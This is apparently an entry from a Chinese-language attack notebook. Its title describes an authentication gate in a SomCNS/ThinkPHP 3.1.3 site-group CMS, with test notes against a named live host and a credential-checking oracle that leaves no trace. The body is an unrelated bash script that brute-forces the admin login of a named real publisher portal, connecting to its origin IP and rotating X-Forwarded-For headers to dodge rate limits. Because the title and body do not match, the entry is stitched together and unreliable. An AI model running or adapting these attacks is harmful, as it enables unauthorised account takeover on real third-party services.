# SomCNS/ThinkPHP3.1.3 站群 Home/Article 的 3 字节 "502" 是凭据闸门（非格式/路由/Host/会话/IP头闸门），格式类绕过全维证否

- **code**: somcns-thinkphp3.1.3-站群-home-article-的-3-字节-502-是凭据闸门-非格式
- **kind**: poc
- **category**: auth-bypass
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）Home/ArticleAction
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-09 在 thbac1dsua6v.gwtkx5hgk5.xyz（源站 45.151.135.176 + 白名单 Host usertobbs.thb.mysqbbthisgoodsfor33333user.top）实测 56 种变体：GET/POST body、PATH_INFO /index.php/Home/Article/edit_cont、?s=/Home/Article/...、参数大小写/顺序/数组/编码、a=ALLOOPEN、a=nonexistzz1/__construct/_initialize/_empty/空、Host=真实域名/evil-白名单/裸IP、Cookie 名与长度边界(admin_user 1/2/33、admin_id 1/30/31/32/33)、CJK/非法UTF-8/数组 cookie/0e magic-hash、会员 PHPSESSID、XFF/X-Real-IP/Client-IP/X-Original-URL 等 IP 信任头 —— 全部 HTTP 200 + chunked + 正文恰好 3 字节 "502"；同期对照 List/index=200/295KB、Admin/Index/login=200/919B，排除闭站。curl.exe 复核一致。
- **tags**: ThinkPHP3.1.3,SomCNS,站群,502,认证绕过,负面情报,oracle,ArticleAction
- **created_at**: 2026-11-09T15:27:37.787Z
- **engine**: 45.151.135.176 / thbac1dsua6v.gwtkx5hgk5.xyz

## 用法

```
验签 oracle：`GET /?g=Home&m=Article&a=<任意动作>  + Cookie: admin_user=<username>; admin_id=<admin.password 原文>` → 通过=完整业务页（allopen ~3545B / edit_cont 回 {"ba_id":..,"ok":1,"ms":"编辑成功"}），失败=恰好 3B "502"（读 size_download，不要看状态码，HTTP 恒 200）。零副作用验签建议用 a=<不存在的动作>：闸门在派发前执行，失败 3B、通过则落到 TP 错误页（非 3B）。注意：Article 组不校验 Host（只要 vhost 能路由，真实域名/白名单/evil-前缀都一样），Admin 组与前端路由才需要白名单 Host。
```

## 正文

```
#!/bin/bash
# Heroku 源站直连 + XFF 首值换桶，做无限制登录尝试
IP=3.33.161.45
HOST=admin.fanatical.com
URL="https://$HOST/api/publisher-portal/auth/login"
EMAIL="$1"
while IFS= read -r pw; do
  xff="198.18.$((RANDOM%250+1)).$((RANDOM%250+1))"
  code=$(curl -sS -m 12 --noproxy '*' -k --resolve "$HOST:443:$IP" \
    -o .one -w "%{http_code}" -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $xff" -X POST "$URL" \
    --data "{\"email\":\"$EMAIL\",\"password\":\"$pw\"}")
  echo "$EMAIL|$pw|$code|$(head -c 80 .one)"
  [ "$code" = "200" ] && break
  sleep 0.05
done < passwords.txt
```
